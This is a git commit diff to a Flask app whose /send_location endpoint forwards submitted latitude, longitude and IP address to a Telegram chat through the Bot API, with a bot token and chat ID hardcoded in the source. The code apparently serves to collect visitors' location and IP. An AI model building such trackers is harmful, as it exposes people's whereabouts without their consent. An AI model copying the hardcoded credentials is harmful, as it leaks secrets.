ac60a2c4b019db28a4f7f995042111efeed92890
gowano2022 <59827733+gowano2022@users.noreply.github.com>
2023-06-24 17:56:57 +0300

    Update main.py

--- main.py
+++ main.py
@@ -9,21 +9,27 @@ def hello():
 
 @app.route('/send_location', methods=['POST'])
 def send_location():
-    latitude = request.form['latitude']
-    longitude = request.form['longitude']
-    ip_address = request.form['ip_address']
-    
-    # Send the location and IP address to Telegram using the Telegram Bot API
+    latitude = request.form.get('latitude')
+    longitude = request.form.get('longitude')
+    ip_address = request.form.get('ip_address')
+
+    if latitude and longitude:
+        # Location is available, send both location and IP address to Telegram
+        message = f"Location: Latitude - {latitude}, Longitude - {longitude}\nIP Address: {ip_address}"
+    else:
+        # Location is not available, send only the IP address to Telegram
+        message = f"IP Address: {ip_address}"
+
+    # Send the message to Telegram using the Telegram Bot API
     bot_token = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg'
     chat_id = '373715044'
-    message = f"Location: Latitude - {latitude}, Longitude - {longitude}\nIP Address: {ip_address}"
     api_url = f"https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={chat_id}&text={message}"
-    
+
     response = requests.get(api_url)
     if response.status_code == 200:
-        return 'Location and IP sent successfully!'
+        return 'Location and/or IP sent successfullyy!'
     else:
-        return 'Failed to send location and IP.'
+        return 'Failed to send location and/or IP.'
 
 if __name__ == '__main__':
     app.run()
